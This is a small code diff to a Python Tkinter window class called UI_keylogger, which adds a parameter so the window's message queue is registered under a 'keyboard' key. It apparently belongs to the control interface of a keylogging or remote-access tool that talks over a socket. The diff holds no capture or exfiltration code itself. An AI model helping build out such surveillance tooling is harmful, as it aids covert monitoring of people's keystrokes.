@@ -5,9 +5,10 @@ import ui.constraints as const
 import queue
 
 class UI_keylogger(tk.Toplevel):
-    def __init__(self, parent, socket_queue):
+    def __init__(self, parent, socket_queue, ui_queues):
         self.ui_queue = queue.Queue()
         self.socket_queue = socket_queue
+        ui_queues['keyboard'] = self.ui_queue
 
         super().__init__(parent)
         self.title = lb.KEYLOGGER_TITLE
